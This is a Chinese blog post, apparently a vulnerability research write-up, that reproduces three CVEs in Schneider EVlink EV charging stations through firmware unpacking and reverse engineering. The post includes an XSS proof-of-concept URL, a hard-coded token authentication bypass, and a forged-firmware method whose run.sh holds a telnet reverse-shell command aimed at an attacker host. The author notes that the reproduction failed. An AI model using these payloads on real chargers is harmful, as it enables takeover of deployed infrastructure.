@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="SX1ang&#39;s blog">
+  <meta name="keyword" content="">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      施耐德充电桩系列漏洞复现 | SX1ang
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>SX1ang</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>施耐德充电桩系列漏洞复现</h2>
+  <p class="post-date">2021-06-23</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="施耐德充电桩系列漏洞复现"><a href="#施耐德充电桩系列漏洞复现" class="headerlink" title="施耐德充电桩系列漏洞复现"></a>施耐德充电桩系列漏洞复现</h1><blockquote>
+<p>  CVE-2021-22706、CVE-2021-22707、CVE-2021-22708 </p>
+</blockquote>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><ol>
+<li><p><strong>CVE-2021-22706：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22706">https://nvd.nist.gov/vuln/detail/CVE-2021-22706</a></strong></p>
+<p> Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’) vulnerability exists in EVlink City (EVC1S22P4 / EVC1S7P4 all versions prior to R8 V3.4.0.1), EVlink Parking (EVW2 / EVF2 / EV.2 all versions prior to R8 V3.4.0.1), and EVlink Smart Wallbox (EVB1A all versions prior to R8 V3.4.0.1 ) that could allow an attacker to impersonate the user who manages the charging station or carry out actions on their behalf when crafted malicious parameters are submitted to the charging station web server. </p>
+</li>
+<li><p><strong>CVE-2021-22707：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22707">https://nvd.nist.gov/vuln/detail/CVE-2021-22707</a></strong></p>
+<p> Use of Hard-coded Credentials vulnerability exists in EVlink City (EVC1S22P4 / EVC1S7P4 all versions prior to R8 V3.4.0.1), EVlink Parking (EVW2 / EVF2 / EV.2 all versions prior to R8 V3.4.0.1), and EVlink Smart Wallbox (EVB1A all versions prior to R8 V3.4.0.1 ) that could allow an attacker to issue unauthorized commands to the charging station web server with administrative privileges. </p>
+</li>
+<li><p><strong>CVE-2021-22708：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22708">https://nvd.nist.gov/vuln/detail/CVE-2021-22708</a></strong></p>
+<p> Improper Verification of Cryptographic Signature vulnerability exists in EVlink City (EVC1S22P4 / EVC1S7P4 all versions prior to R8 V3.4.0.1), EVlink Parking (EVW2 / EVF2 / EV.2 all versions prior to R8 V3.4.0.1), and EVlink Smart Wallbox (EVB1A all versions prior to R8 V3.4.0.1 ) that could allow an attacker to craft a malicious firmware package and bypass the signature verification mechanism. </p>
+</li>
+</ol>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h3><p>拿到压缩文件后解压，得到五个文件：</p>
+<ol>
+<li> EVlink充电桩介绍：EVlink_charging station_Release_Note_R07_Final.pdf</li>
+<li> 调试指南：DOCA0060EN-07.pdf、DOCA0060FR-07.pdf</li>
+<li> 升级固件包：r7_update_3.3.0.12_d4.epk</li>
+<li> Intel Hex 文件：V_1400.hex</li>
+</ol>
+<p>分析的对象是升级固件包 r7_update_3.3.0.12_d4.epk，使用binwalk进行分析，可知为tar压缩文件；</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211102163428681.png"></p>
+<p>使用tar命令解压 r7_update_3.3.0.12_d4.epk，得到下列文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">webysx@webysx-virtual-machine:~/IOT/interview/r7_update_3.3.0.12_d4$ ll</span><br><span class="line">总用量 16360</span><br><span class="line">drwxrwxr-x 4 webysx webysx    4096 11月  1 17:01 ./</span><br><span class="line">drwxrwxr-x 3 webysx webysx    4096 11月  1 15:00 ../</span><br><span class="line">-rwxr-xr-x 1 webysx webysx    7576 5月  29  2020 at91sam9g20ek-bootstrap-3.6.11-201612.bin*</span><br><span class="line">-rw-r--r-- 1 webysx webysx    2074 5月  29  2020 bspv5_target_pre-update_script.sh</span><br><span class="line">-rwxr-xr-x 1 webysx webysx    9477 5月  29  2020 bspv5_target_update_script.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx    2214 5月  29  2020 common_bspv4_target_shell_scripts.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx    2443 5月  29  2020 common_bspv5_target_shell_scripts.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx   10744 5月  29  2020 common_target_shell_scripts.sh*</span><br><span class="line">-rw-r--r-- 1 webysx webysx      68 5月  29  2020 CONTROL</span><br><span class="line">-rw-r--r-- 1 webysx webysx 8371748 5月  29  2020 evse_base_jffs2.img</span><br><span class="line">-rwxr-xr-x 1 webysx webysx   11688 5月  29  2020 redLight*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx     213 5月  29  2020 run.sh*</span><br><span class="line">-rw-r--r-- 1 webysx webysx  688041 5月  29  2020 ssh.tgz</span><br><span class="line">-rw-r--r-- 1 webysx webysx    4096 5月  29  2020 u-boot_env-bspv5p5.bin</span><br><span class="line">-rw-r--r-- 1 webysx webysx    4096 5月  29  2020 u-boot_env-bspv5p7.bin</span><br><span class="line">-rw-r--r-- 1 webysx webysx 5962189 5月  29  2020 uImage.parkingboard_v2_1</span><br></pre></td></tr></table></figure>
+<p>通过使用binwalk分析上面这些文件，筛选出两个重要的文件：evse_base_jffs2.img和uImage.parkingboard_v2_1，分别是JFFS2文件系统镜像和uboot镜像。</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211102165430218.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211102165540774.png"></p>
+<p>对这两个文件分别进行解包，由于binwalk不能直接分析和解包JFFS2文件系统，所以使用 <a target="_blank" rel="noopener" href="https://blog.csdn.net/doudoudouzoule/article/details/86017841">firmware-mod-kit</a> 进行解包，得到两个文件系统。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">webysx@webysx-virtual-machine:~&#x2F;IOT&#x2F;interview&#x2F;r7_update_3.3.0.12_d4&#x2F;_uImage.parkingboard_v2_1.extracted&#x2F;_5FB0.extracted&#x2F;_340338.extracted&#x2F;cpio-root$ ll</span><br><span class="line">总用量 3548</span><br><span class="line">drwxrwxr-x 19 webysx webysx    4096 11月  2 12:00 .&#x2F;</span><br><span class="line">drwxrwxr-x  3 webysx webysx    4096 11月  1 17:15 ..&#x2F;</span><br><span class="line">drwxr-xr-x  2 webysx webysx    4096 11月  1 16:07 bin&#x2F;</span><br><span class="line">drwxr-xr-x  4 webysx webysx    4096 11月  1 16:07 dev&#x2F;</span><br><span class="line">drwxr-xr-x  7 webysx webysx    4096 11月  1 16:07 etc&#x2F;</span><br><span class="line">-rwxr-xr-x  1 webysx webysx     176 11月  1 16:07 init*</span><br><span class="line">drwxr-xr-x  3 webysx webysx    4096 11月  1 16:07 lib&#x2F;</span><br><span class="line">lrwxrwxrwx  1 webysx webysx       3 11月  1 16:07 lib32 -&gt; lib&#x2F;</span><br><span class="line">lrwxrwxrwx  1 webysx webysx      11 11月  1 16:07 linuxrc -&gt; bin&#x2F;busybox*</span><br><span class="line">drwxr-xr-x  2 webysx webysx    4096 11月  1 16:07 media&#x2F;</span><br><span class="line">drwxr-xr-x  5 webysx webysx    4096 11月  1 16:07 mnt&#x2F;</span><br><span class="line">drwxr-xr-x  3 webysx webysx    4096 11月  1 16:07 opt&#x2F;</span><br><span class="line">drwxr-xr-x  2 webysx webysx    4096 11月  1 16:07 proc&#x2F;</span><br><span class="line">-rwxr-xr-x  1 webysx webysx 3548032 11月  1 20:10 qemu-arm-static*</span><br><span class="line">drwx------  3 webysx webysx    4096 11月  1 16:07 root&#x2F;</span><br><span class="line">drwxr-xr-x  2 webysx webysx    4096 11月  1 16:07 run&#x2F;</span><br><span class="line">drwxr-xr-x  2 webysx webysx    4096 11月  1 16:07 sbin&#x2F;</span><br><span class="line">drwxr-xr-x  2 webysx webysx    4096 11月  1 22:16 stdlibs&#x2F;</span><br><span class="line">drwxr-xr-x  2 webysx webysx    4096 11月  1 16:07 sys&#x2F;</span><br><span class="line">drwxrwxrwt  3 webysx webysx    4096 11月  1 22:17 tmp&#x2F;</span><br><span class="line">drwxr-xr-x  7 webysx webysx    4096 11月  1 16:07 usr&#x2F;</span><br><span class="line">drwxr-xr-x  5 webysx webysx    4096 11月  1 16:07 var&#x2F;</span><br><span class="line">drwxr-xr-x  4 webysx webysx    4096 11月  2 12:00 www&#x2F;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">webysx@webysx-virtual-machine:~/IOT/interview/r7_update_3.3.0.12_d4/jffs2-root$ ll</span><br><span class="line">总用量 8090</span><br><span class="line">drwxr-xr-x 6 webysx webysx       0 11月  1 17:01 ./</span><br><span class="line">drwxrwxr-x 4 webysx webysx    4096 11月  1 17:01 ../</span><br><span class="line">-rw-r--r-- 1 webysx webysx 8270103 5月  29  2020 evse_base.tgz</span><br><span class="line">-rwxr-xr-x 1 webysx webysx      97 5月  29  2020 evse_postlaunch.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx    2027 5月  29  2020 evse_prelaunch.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx     202 5月  29  2020 kill_evse_apps.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx     736 5月  29  2020 launch_evse_apps.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx    3014 5月  29  2020 migrateConfAndDbFromBSP4_to_BSP5.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx     640 5月  29  2020 monitor.sh*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx    1103 5月  29  2020 ntp-status.sh*</span><br><span class="line">drwxr-xr-x 5 webysx webysx       0 11月  1 16:59 opt/</span><br><span class="line">drwxr-xr-x 2 webysx webysx       0 5月  29  2020 stdlibs/</span><br><span class="line">drwxr-xr-x 4 webysx webysx       0 5月  29  2020 usr/</span><br></pre></td></tr></table></figure>
+<p>通过查看shell脚本中的一些路径信息，可以合并两个文件系统，JFFS2文件系统是挂载到cpio文件系统中的。</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211102170409310.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211102172726367.png"></p>
+<p>同时通过分析shell脚本还可以得到webserver的启动命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH&#x3D;&quot;$LD_LIBRARY_PATH:&#x2F;mnt&#x2F;datas&#x2F;usr&#x2F;lib:&#x2F;mnt&#x2F;datas&#x2F;opt&#x2F;evse:&#x2F;mnt&#x2F;datas&#x2F;stdlibs&quot;</span><br><span class="line"></span><br><span class="line">cd &#x2F;mnt&#x2F;datas&#x2F;opt&#x2F;www&#x2F;</span><br><span class="line">.&#x2F;mini_httpd_armv5l -C mini_http_armv5l.conf -P CP&#x3D;&quot;This is not a privacy policy!&quot; </span><br></pre></td></tr></table></figure>
+
+
+<p>复现的三个漏洞都出现在<code>/mnt/datas/opt/www/cgi-bin/cgiServer</code>程序中，IDA分析cgiServer，发现有很多<code>%s called (</code>字符串，根据参考的文章知道这是输出调试信息；</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103121224634.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103121407193.png"></p>
+<p>通过这些调试信息可以判断上下文代码的功能，比如TestPassword，CheckPassword等，通过这些信息可以方便逆向分析：</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103121556698.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103121718247.png"></p>
+<h3 id="CVE-2021-22706"><a href="#CVE-2021-22706" class="headerlink" title="CVE-2021-22706"></a>CVE-2021-22706</h3><blockquote>
+<p>  漏洞原理是访问 /cgi-bin/cgiServer?worker=…&amp;lang=… 路径时，如果登录信息检查不正确（未登录），那么就会显示错误页面，错误页面会将lang参数的值显示在页面中，并且没有过滤，从而导致存在xss漏洞。 </p>
+</blockquote>
+<p>通过搜索错误信息定位到生成错误页面的地方，通读伪代码。</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103093133128.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103093640462.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103093406662.png"></p>
+<p>程序首先会验证用户名和密码，如果验证不通过，就会生成错误信息页面，在生成的过程中，没有对获取到的lang参数的值进行过滤，直接拼接到错误页面中，造成xss漏洞。</p>
+<p><strong>POC：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;cgi-bin&#x2F;cgiServer?worker&#x3D;Login&amp;lang&#x3D;%22;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="CVE-2021-22707"><a href="#CVE-2021-22707" class="headerlink" title="CVE-2021-22707"></a>CVE-2021-22707</h3><blockquote>
+<p>在固件中存在硬编码的token。</p>
+</blockquote>
+<p>根据参考文章找到cgiServer处理session验证的地方，程序首先从HTTP_COOKIE中获取SESSIONID、SESSIONTOKEN、CURLTOKEN等变量的值；</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103122552566.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103122759945.png"></p>
+<p>继续往下分析：</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103123356720.png"></p>
+<p>程序将CURLTOKEN和一个字符串常量进行比较，如果两者相等，就将v153设置为1，这里的字符串常量就是硬编码的token，v153就是一个token验证通过的标志位。然后再继续判断SESSIONID是否为空，如果为空就将v55设置成evse，否则将v55设置为SESSIONID，这里可以推测evse就是一个默认的SESSIONID。</p>
+<p>下面代码在登录成功和失败时对v153分别赋不同的值，可以推测v153是一个标志位。</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103143817322.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103143903216.png"></p>
+<p><strong>POC：</strong></p>
+<p>通过在cookie字段中设置CURLTOKEN可以绕过token验证，并且设置SESSIONID为admin可以绕过权限验证，相当于拿到管理员权限。</p>
+<h3 id="CVE-2021-22708"><a href="#CVE-2021-22708" class="headerlink" title="CVE-2021-22708"></a>CVE-2021-22708</h3><blockquote>
+<p>  可以构造升级文件并进行重打包造成命令执行漏洞。</p>
+</blockquote>
+<p>根据参考文章查看execv函数的交叉引用，找到处理固件升级的地方，分析代码功能：</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103170944274.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211103170825070.png"></p>
+<p>通过snprintf输出的调试信息和执行的shell脚本名称可以知道此处应该就是处理固件包升级的地方。首先程序调用setenv函数设置环境变量<code>EPK_KEY</code>，这个后面会用到。然后执行<code>epk-install.sh</code>脚本。查看<code>epk-install.sh</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line"></span><br><span class="line">file=$1</span><br><span class="line"></span><br><span class="line">if [[ &quot;$EPK_KEY&quot; != &quot;&quot; ]]; then</span><br><span class="line"><span class="meta">  #</span><span class="bash"> use private key from env</span></span><br><span class="line">  private_key=$EPK_KEY</span><br><span class="line">else</span><br><span class="line"><span class="meta">  #</span><span class="bash"> use 2nd param</span></span><br><span class="line">  private_key=$2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">···</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> get exclusive lock or abort</span></span><br><span class="line">lock || abort &quot;KO, epk-install.sh is already running&quot;</span><br><span class="line"></span><br><span class="line">if [[ &quot;$file&quot; == &quot;&quot; ]]; then</span><br><span class="line">  abort &quot;No file&quot;</span><br><span class="line">fi</span><br><span class="line">if [[ ! -f $file ]]; then</span><br><span class="line">  abort &quot;Unknown file $file&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">log_info &quot;Extracting $file into $INSTALL_DIR&quot;</span><br><span class="line"></span><br><span class="line">···</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> extract files from archive (epz is an epk.gz, but tar xf will handle it)</span></span><br><span class="line">tar xf &quot;$file&quot;</span><br><span class="line"></span><br><span class="line">if [[ ! -f CONTROL ]]; then</span><br><span class="line">  abort &quot;KO, missing signature&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo $private_key &gt; private</span><br><span class="line"></span><br><span class="line">find . -type f | grep -v CONTROL | xargs sha256sum | awk &#x27;&#123;print $1&#125;&#x27; | sort | sha256sum &gt; ../CONTROL2</span><br><span class="line">mv ../CONTROL2 .</span><br><span class="line">rm private</span><br><span class="line"></span><br><span class="line">if [[ &quot;`diff CONTROL CONTROL2`&quot; != &quot;&quot; ]]; then</span><br><span class="line">  cat CONTROL CONTROL2</span><br><span class="line">  abort &quot;KO, signatures mismatch&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ ! -f run.sh ]]; then</span><br><span class="line">  abort &quot;KO, missing run.sh&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">./run.sh $paramsrun</span><br><span class="line">ret=$?</span><br><span class="line"></span><br><span class="line">···</span><br></pre></td></tr></table></figure>
+<p>程序首先会获得环境变量<code>EPK_KEY</code>的值，然后将其赋给变量<code>private_key</code>。然后判断代安装的升级包文件是否存在，如果存在，就提取到一个临时目录。然后将<code>private_key</code>保存到private文件中，根据private计算出一个sha256sum的值写到CONTROL2文件中。最后比较CONTROL和CONTROL2文件，如果相同，会执行<code>run.sh</code>。CONTROL文件和run.sh文件都在压缩包中，是可控的，可以在run.sh中写入想要执行的命令。sha256sum可以直接通过命令计算出来。最后使用<code>tar cf</code>命令打包，更新固件即可触发。 </p>
+<p><strong>POC：</strong></p>
+<p>可以将一开始的epk文件解包，然后再修改run.sh，将反弹shell的命令写入其中，然后再通过命令计算出sha256sum的值并写入到CONTROL2中。最后使用tar命令打包成.epk文件。</p>
+<p>反弹shell命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;目标ip&gt; &lt;目标port&gt; | &#x2F;bin&#x2F;sh | telnet &lt;攻击者ip&gt; &lt;攻击者port&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211104195237419.png"></p>
+<p>最后在升级的时候选择epk文件即可。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>  在搭建环境的时候遇到很多问题，最终还是没能复现出来，主要记录搭建的过程和失败的原因。</p>
+</blockquote>
+<p><strong>qemu-user：</strong></p>
+<p>经过前面的分析知道，webserver的启动命令是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . .&#x2F;qemu-arm-static .&#x2F;mnt&#x2F;datas&#x2F;opt&#x2F;www&#x2F;mini_httpd_armv5l -C .&#x2F;mnt&#x2F;datas&#x2F;opt&#x2F;www&#x2F;mini_http_armv5l.conf -P CP&#x3D;&quot;This is not a privacy policy!&quot;</span><br></pre></td></tr></table></figure>
+<p>一开始使用qemu user模式运行程序，程序能够运行起来，但是访问都是404 Not Found。</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211105010840039.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211105010759185.png"></p>
+<p>通过调试的时候因为gdb不支持fork，调试程序的时候遇到fork就会崩掉，如果patch掉所有的fork调用，程序运行到后面就会崩掉，所以没有办法用IDA去调试。</p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211105092510269.png"></p>
+<p><strong>qemu-system：</strong></p>
+<p>后面改用qemu system模式去模拟，但是官方下载的内核版本太低了，会报错；</p>
+<p>后来试着自己编译内核，qemu镜像文件，但是没有成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">总用量 80</span><br><span class="line">drwxr-xr-x 2 webysx webysx 4096 11月  1 16:07 .&#x2F;</span><br><span class="line">drwxr-xr-x 7 webysx webysx 4096 11月  1 16:07 ..&#x2F;</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  423 11月  1 16:07 rcK* &#x3D;&#x3D;&gt;kill，关闭所有守护进程</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  408 11月  1 16:07 rcS* &#x3D;&#x3D;&gt;start，启动所有守护进程</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  649 11月  1 16:07 S01logging* &#x3D;&#x3D;&gt;系统log</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  776 11月  1 16:07 S01watchdog* &#x3D;&#x3D;&gt;启动看门狗</span><br><span class="line">-rwxr-xr-x 1 webysx webysx 1321 11月  1 16:07 S20urandom* &#x3D;&#x3D;&gt;存放系统重启的随机种子</span><br><span class="line">-rwxr-xr-x 1 webysx webysx 6011 11月  1 16:07 S30bspv5* </span><br><span class="line">-rwxr-xr-x 1 webysx webysx  359 11月  1 16:07 S40network* &#x3D;&#x3D;&gt;启动网络**</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  634 11月  1 16:07 S50collectd*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  530 11月  1 16:07 